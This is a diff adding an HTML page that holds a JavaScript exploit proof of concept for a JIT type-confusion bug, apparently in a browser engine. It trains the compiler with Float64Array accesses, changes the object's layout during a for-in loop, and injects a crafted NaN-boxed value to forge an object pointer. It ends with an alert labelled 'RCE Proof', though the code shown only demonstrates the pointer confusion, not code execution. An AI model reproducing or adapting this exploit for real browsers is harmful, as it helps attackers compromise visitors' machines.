@@ -1,0 +1,39 @@
+<html>
+<body>
+    <script>
+        let abuf = new ArrayBuffer(0x10);
+        let bbuf = new BigUint64Array(abuf);
+        let fbuf = new Float64Array(abuf);
+
+        obj = { x: 1234, y: 1234 };
+
+        function trigger(arg, a2) {
+            for (let i in obj) {
+                obj = [1];  // Modify object layout dynamically
+                let out = arg[i];  // Trigger vulnerability
+                a2.x = out;
+            }
+        }
+        noInline(trigger);
+
+        function main() {
+            t = { x: {} };
+            trigger(obj, t);
+
+            // Training the JIT compiler with a normal Float64Array
+            for (let i = 0; i < 0x1000; i++) {
+                trigger(fbuf, t);
+            }
+
+            // Inject NaN value that causes overflow into JSObject pointer
+            bbuf[0] = 0xfffe000012345678n;
+            trigger(fbuf, t);
+
+            // Display proof of code execution
+            alert("RCE Proof: " + t.x);
+        }
+
+        main();
+    </script>
+</body>
+</html>
